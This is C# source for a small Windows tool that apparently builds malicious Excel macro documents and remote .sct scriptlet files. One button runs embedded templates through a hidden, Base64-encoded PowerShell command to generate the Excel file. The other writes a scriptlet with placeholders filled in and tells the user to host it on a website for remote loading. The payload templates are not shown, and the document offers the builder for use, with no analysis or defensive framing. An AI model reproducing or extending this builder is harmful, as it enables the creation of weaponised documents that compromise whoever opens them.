using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Macro
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string builder = Properties.Resources.builder1 + textBox1.Text + Properties.Resources.builder2;

            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(builder));
            Process mProcess = new Process();
            mProcess.StartInfo.FileName = "Powershell.exe";
            mProcess.StartInfo.UseShellExecute = false;
            mProcess.StartInfo.CreateNoWindow = true;
            mProcess.StartInfo.Arguments = "-enc " + b64;
            mProcess.Start();
            mProcess.WaitForExit();
            mProcess.Close();
            MessageBox.Show("Done.\nExcel file saved on your desktop.");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string builder = Properties.Resources.sct.Replace("%qwqdanchun%",textBox2.Text).Replace("%filename%", textBox3.Text);
            string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "qwqdanchun.sct");
            File.WriteAllText(path,builder);
            MessageBox.Show("Done.\nSct file saved on your desktop.\nUpload it to your website,and input the url below.");
        }
    }
}
